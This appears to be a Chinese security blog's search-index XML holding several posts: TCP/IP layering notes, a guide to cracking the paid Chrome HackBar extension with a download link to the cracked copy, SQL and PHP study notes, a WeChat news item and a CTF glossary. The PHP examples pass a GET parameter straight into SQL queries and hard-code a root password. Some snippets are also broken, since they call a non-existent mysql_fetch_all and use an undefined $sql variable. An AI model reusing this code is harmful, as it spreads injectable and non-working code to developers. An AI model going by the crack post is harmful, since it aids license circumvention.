与对方计算机之间通过多台计算机或网络设备进行传输时，网络层所 起的作用就是在众多的选项内选择一条传输路线。　　</p><ul><li>链路层<br>　　用来处理连接网络的硬件部分。包括控制操作系统、硬件的设备驱 动、NIC（Network Interface Card，网络适配器，即网卡），及光纤等 物理可见部分（还包括连接器等一切传输媒介）。硬件上的范畴均在 链路层的作用范围之内。</li></ul><h2 id="三、TCP-x2F-IP-通信传输流"><a href="#三、TCP-x2F-IP-通信传输流" class="headerlink" title="三、TCP&#x2F;IP 通信传输流"></a>三、TCP&#x2F;IP 通信传输流</h2><p><img src="https://img.xpctf.cn/img/20200603190313.png"></p><p>　　利用 TCP&#x2F;IP 协议族进行网络通信时，会通过分层顺序与对方进行通 信。发送端从应用层往下走，接收端则往应用层往上走。</p><p>　　我们用 HTTP 举例来说明，首先作为发送端的客户端在应用层 （HTTP 协议）发出一个想看某个 Web 页面的 HTTP 请求。</p><p>　　接着，为了传输方便，在传输层（TCP 协议）把从应用层处收到的数 据（HTTP 请求报文）进行分割，并在各个报文上打上标记序号及端 口号后转发给网络层。</p><p>　　在网络层（IP 协议），增加作为通信目的地的 MAC 地址后转发给链 路层。这样一来，发往网络的通信请求就准备齐全了。</p><p>　　接收端的服务器在链路层接收到数据，按序往上层发送，一直到应用 层。当传输到应用层，才能算真正接收到由客户端发送过来的 HTTP 请求。<br>　　<br><img src="https://img.xpctf.cn/img/20200603190343.png"><br>　　发送端在层与层之间传输数据时，每经过一层时必定会被打上一个该 层所属的首部信息。反之，接收端在层与层传输数据时，每经过一层 时会把对应的首部消去。</p><p>　　这种把数据信息包装起来的做法称为封装（encapsulate）。</p>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 协议分层 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chrome浏览器hackbar破解版</title>
      <link href="/posts/c74/"/>
      <url>/posts/c74/</url>
      
        <content type="html"><![CDATA[<p>个人习惯使用Chrome浏览器，可能是因为Google账号吧，Chrome插件里有三个hackbar插件</p><p><img src="https://img.xpctf.cn/img/20200602095105.png" alt="免费插件"><br><img src="https://img.xpctf.cn/img/20200602095147.png" alt="收费插件"><br>另一个我没用过，不知道有没有收费。这两个是我安装的hack插件，免费的用来解码，很好用</p><p>由于hackbar是收费版本，学网安的花这冤枉钱干啥嘛，所以拉出Google就是搜索。真让我搜到了破解方法</p><p>修改\djmoeoifnlhjolebkehmpaocfnipknbh\2.2.8_0\theme\js\hackbar-panel.js第45行和52行如下修改即可</p><p><img src="https://img.xpctf.cn/img/20200602095916.png" alt="修改前"></p><p><img src="https://img.xpctf.cn/img/20200602095731.png" alt="修改后"></p><p>我还为大家提供了压缩包，下载解压后开发者模式加载解压包就可以使用：<a href="https://lanzous.com/id8qkvi">下载地址</a></p><p>解压密码：<a href="http://www.xpctf.cn/">www.xpctf.cn</a></p><p>Chrome浏览器推荐使用canary 版本，canary 版本在开发者模式使用不会爆出如下提示</p><p><img src="https://img.xpctf.cn/img/P@Y0W615XK9V%7DEDRJE5C$ZX.png"></p><p>Chrome  canary版：<a href="https://www.google.com/intl/zh-CN/chrome/canary/">下载地址</a></p>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Chrome插件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL基础学习笔记</title>
      <link href="/posts/94efba92/"/>
      <url>/posts/94efba92/</url>
      
        <content type="html"><![CDATA[<blockquote><p>个人在学习SQL过程中的笔记，使用Mysql围绕数据库增、删、改、查学习</p></blockquote><h2 id="一、增"><a href="#一、增" class="headerlink" title="一、增"></a>一、增</h2><p>使用 <strong>CREATE</strong> 增加</p><h3 id="1-创建数据库-Root"><a href="#1-创建数据库-Root" class="headerlink" title="1.创建数据库(Root)"></a>1.创建数据库(Root)</h3><blockquote><p>CREATE database 数据库名;</p></blockquote><h3 id="2-创建数据表"><a href="#2-创建数据表" class="headerlink" title="2.创建数据表"></a>2.创建数据表</h3><blockquote><p>CREATE table 表名(字段名1 字段类型,字段名2 字段类型);</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE IF NOT EXISTS `runoob_tbl`(</span><br><span class="line">   `runoob_id` INT UNSIGNED AUTO_INCREMENT,</span><br><span class="line">   `runoob_title` VARCHAR(100) NOT NULL,</span><br><span class="line">   `runoob_author` VARCHAR(40) NOT NULL,</span><br><span class="line">   `submission_date` DATE,</span><br><span class="line">   PRIMARY KEY ( `runoob_id` )</span><br><span class="line">)ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br></pre></td></tr></table></figure><h3 id="3-插入数据"><a href="#3-插入数据" class="headerlink" title="3.插入数据"></a>3.插入数据</h3><h4 id="3-1-标准形式"><a href="#3-1-标准形式" class="headerlink" title="3.1 标准形式"></a>3.1 标准形式</h4><blockquote><p>insert into 表名 (列名1,列名2,…..列名n) values(值1,值2,….值n);<br>insert into user(username,password) values(‘test’,’test123’);</p></blockquote><p><img src="https://img.xpctf.cn/img/20200615104640.png"></p><h4 id="3-2-忽略列名"><a href="#3-2-忽略列名" class="headerlink" title="3.2 忽略列名"></a>3.2 忽略列名</h4><p>忽略列名必须列名和值对应，否则报错。</p><blockquote><p>insert into 表名 values(值1,值2,….值n);<br>insert into user values(‘test’,’test123’);</p></blockquote><p><img src="https://img.xpctf.cn/img/20200615105520.png"></p><h4 id="3-2-set关键字插入"><a href="#3-2-set关键字插入" class="headerlink" title="3.2 set关键字插入"></a>3.2 set关键字插入</h4><blockquote><p>insert into user set 列名1&#x3D;值1,列名2&#x3D;值2,列名3&#x3D;值3;<br>insert into user set username&#x3D;’test3’,password&#x3D;’test123’;</p></blockquote><p><img src="https://img.xpctf.cn/img/20200615105936.png"></p><h2 id="二、删"><a href="#二、删" class="headerlink" title="二、删"></a>二、删</h2><p>使用<strong>DROP</strong>删除数据</p><h3 id="1-删除数据库-Root"><a href="#1-删除数据库-Root" class="headerlink" title="1.删除数据库(Root)"></a>1.删除数据库(Root)</h3><blockquote><p>drop database 数据库名;</p></blockquote><h3 id="2-删除数据表"><a href="#2-删除数据表" class="headerlink" title="2.删除数据表"></a>2.删除数据表</h3><blockquote><p>DROP TABLE 表名;</p></blockquote><h3 id="3-删除数据"><a href="#3-删除数据" class="headerlink" title="3.删除数据"></a>3.删除数据</h3><h4 id="3-1-删除一行"><a href="#3-1-删除一行" class="headerlink" title="3.1 删除一行"></a>3.1 删除一行</h4><blockquote><p>delete from 表名 where 列名&#x3D;值;<br>delete from user where id&#x3D;4;</p></blockquote><p><img src="https://img.xpctf.cn/img/20200615144827.png"></p><h4 id="3-2-删除多行"><a href="#3-2-删除多行" class="headerlink" title="3.2 删除多行"></a>3.2 删除多行</h4><blockquote><p>delete from 表名 where 列名 in (开始,结束);<br>delete from user where id in (4,5);</p></blockquote><p><img src="https://img.xpctf.cn/img/20200615152847.png"></p><h4 id="3-3-删除所有"><a href="#3-3-删除所有" class="headerlink" title="3.3 删除所有"></a>3.3 删除所有</h4><blockquote><p>delete from 表名;<br>delete from user;</p></blockquote><p><img src="https://img.xpctf.cn/img/20200615153032.png"></p><h2 id="三、改"><a href="#三、改" class="headerlink" title="三、改"></a>三、改</h2><h3 id="1-修改表名称"><a href="#1-修改表名称" class="headerlink" title="1.修改表名称"></a>1.修改表名称</h3><blockquote><p>ALTER TABLE users2 RENAME users3;</p></blockquote><h3 id="2-数据更新"><a href="#2-数据更新" class="headerlink" title="2.数据更新"></a>2.数据更新</h3><h4 id="2-1-基本格式"><a href="#2-1-基本格式" class="headerlink" title="2.1 基本格式"></a>2.1 基本格式</h4><blockquote><p>update 表名 set 列名&#x3D;值 whrer 列名&#x3D;值;<br>update user set password&#x3D;’qwe123’ where username&#x3D;’admin’;</p></blockquote><p><img src="https://img.xpctf.cn/img/20200615110512.png"></p><h4 id="2-2-修改多列"><a href="#2-2-修改多列" class="headerlink" title="2.2 修改多列"></a>2.2 修改多列</h4><blockquote><p>update 表名 set 列名1&#x3D;值1,列名2&#x3D;值2,列名n&#x3D;值n whrer 列名&#x3D;值;<br>update user set password&#x3D;’qwe123’ ,uesrname&#x3D;’root’ where username&#x3D;’admin’;</p></blockquote><p><img src="https://img.xpctf.cn/img/20200615111128.png"></p><h4 id="3-3-忽略条件"><a href="#3-3-忽略条件" class="headerlink" title="3.3 忽略条件"></a>3.3 忽略条件</h4><p>该语句会更新当前表得所有列的值，一般很少用。</p><blockquote><p>update 表名 set 列名&#x3D;值;<br>update user set password&#x3D;’qwe666’;</p></blockquote><p><img src="https://img.xpctf.cn/img/20200615111540.png"></p><h2 id="四、查"><a href="#四、查" class="headerlink" title="四、查"></a>四、查</h2><h3 id="1-基础查询"><a href="#1-基础查询" class="headerlink" title="1.基础查询"></a>1.基础查询</h3><blockquote><p>select 列名 from 表名;<br>select username from user;</p></blockquote><p><img src="https://img.xpctf.cn/img/20200615102418.png"></p><h3 id="2-查询多列"><a href="#2-查询多列" class="headerlink" title="2.查询多列"></a>2.查询多列</h3><blockquote><p>select 列名1,列名2 from 表名;<br>select username,password from user;</p></blockquote><p><img src="https://img.xpctf.cn/img/20200615102453.png"></p><h3 id="3-查询所有列"><a href="#3-查询所有列" class="headerlink" title="3.查询所有列"></a>3.查询所有列</h3><blockquote><p>seletc * from 表名;<br>select * from user;</p></blockquote><p><img src="https://img.xpctf.cn/img/20200615102522.png"></p><h3 id="4-条件查询"><a href="#4-条件查询" class="headerlink" title="4.条件查询"></a>4.条件查询</h3><blockquote><p>select 列名 from 表名 where 列名&#x3D;xx;<br>select * from user where username&#x3D;’admin’;</p></blockquote><p><img src="https://img.xpctf.cn/img/20200615102548.png"></p><h2 id="五、PHP操作MySQL"><a href="#五、PHP操作MySQL" class="headerlink" title="五、PHP操作MySQL"></a>五、PHP操作MySQL</h2><h3 id="1-MySQL和MySQLi的区别"><a href="#1-MySQL和MySQLi的区别" class="headerlink" title="1.MySQL和MySQLi的区别"></a>1.MySQL和MySQLi的区别</h3><ul><li>MySQL是非持久连接，MySQLi是持久连接</li><li>MySQL不支持多语句执行，MySQLi支持多语句执行</li><li>MySQL不支持面向对象，MySQLi支持面向对象</li></ul><h3 id="2-MySQL"><a href="#2-MySQL" class="headerlink" title="2.MySQL"></a>2.MySQL</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//接收前台参数</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">//新建MySQL连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysql_connect</span>(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;toor123&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;数据库连接失败！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">mysql_select_db</span>(<span class="string">&#x27;web&#x27;</span>);</span><br><span class="line"><span class="comment">//执行SQL语句</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from user where id=<span class="subst">$id</span>;&quot;</span>;</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="comment">//数据处理</span></span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">mysql_fetch_all</span>(<span class="variable">$row</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="comment">//关闭MySQL连接</span></span><br><span class="line"><span class="title function_ invoke__">mysql_close</span>(<span class="variable">$conn</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-MySQLi面向过程"><a href="#3-MySQLi面向过程" class="headerlink" title="3.MySQLi面向过程"></a>3.MySQLi面向过程</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from user where id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;toor123&#x27;</span>,<span class="string">&#x27;web&#x27;</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">mysqli_fetch_all</span>(<span class="variable">$row</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br></pre></td></tr></table></figure><h3 id="4-MySQLi面向对象"><a href="#4-MySQLi面向对象" class="headerlink" title="4.MySQLi面向对象"></a>4.MySQLi面向对象</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//新建MySQL连接</span></span><br><span class="line"><span class="variable">$mysql</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;toor123&#x27;</span>,<span class="string">&#x27;web&#x27;</span>);</span><br><span class="line"><span class="comment">//执行SQL语句</span></span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$mysql</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="comment">//数据处理</span></span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$row</span>-&gt;<span class="title function_ invoke__">fetch_all</span>();</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="comment">//关闭SQL连接</span></span><br><span class="line"><span class="variable">$mysql</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="5-MySQLi多语句执行"><a href="#5-MySQLi多语句执行" class="headerlink" title="5.MySQLi多语句执行"></a>5.MySQLi多语句执行</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from user where id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;toor123&#x27;</span>,<span class="string">&#x27;web&#x27;</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">mysqli_fetch_all</span>(<span class="variable">$row</span>);</span><br><span class="line"><span class="variable">$sql1</span> = <span class="string">&quot;select * from user where id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">mysqli_fetch_all</span>(<span class="variable">$row</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重磅消息，微信号可以修改啦</title>
      <link href="/posts/29e8172/"/>
      <url>/posts/29e8172/</url>
      
        <content type="html"><![CDATA[<p>每次推送内测版微信的时候，大家最想要的就是修改微信号，某某5201314，这样的微信号有救啦！</p><p><img src="https://img.xpctf.cn/img/640"></p><p>想必马爸爸也知道大家的苦衷了，我们在新版微信中注意到了修改微信号的界面下方提示的是“微信是账号的唯一凭证，只能设置一次”，<strong>而在7.0.15版本中已经变成了“微信号是账号的唯一凭证，一年只能修改一次”</strong></p><p><img src="https://img.xpctf.cn/img/20200530103830.png"></p><p>值得注意的是，这个入口只有没有设置过微信号的小伙伴进入，而已经设置过微信的小伙伴们就没办法直接进入啦，这说明微信还是会在后期逐渐的打开微信号修改权限的！</p><p>另外，小编也看到了一些特殊手段进行修改微信号，这里不方便透露，不过在此提醒大家，在使用微信的过程中请严格总受微信使用规则，以免造成封号！</p><p><img src="https://img.xpctf.cn/img/20200530103905.png"></p><p>该来的迟早会来，大家可以再等等，小编不建议去花钱修改微信号，以免上当受骗！</p>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 微信 </tag>
            
            <tag> 最新 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF名词术语-持续更新</title>
      <link href="/posts/edd74335/"/>
      <url>/posts/edd74335/</url>
      
        <content type="html"><![CDATA[<ul><li>Writeup：赛题解析，赛后写的报告，解题思路和过程</li><li>一血：第一个解题的队伍，一般有积分奖励</li><li>hint：题目提示，如果题目太难没队伍解出来会放</li><li>师傅：技术在自己之上，能在对方身上学到东西的称师傅</li><li>“师傅”：一般是同行互吹，或者互谦</li><li>肝题：有思路，没更好的方法得到flag，比如画二维码</li><li>Exploit：利用系统漏洞进行攻击的动作 简称exp 比如exp.py</li><li>Payload：有效载荷，大佬们一直说构造payload，我也不是很了解</li><li>Webshell：web的方式执行shell代码，一句话就是典型的Webshell</li><li>Py：一般是互相交换Flag</li><li>非预期：非出题人预期的解题方式</li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
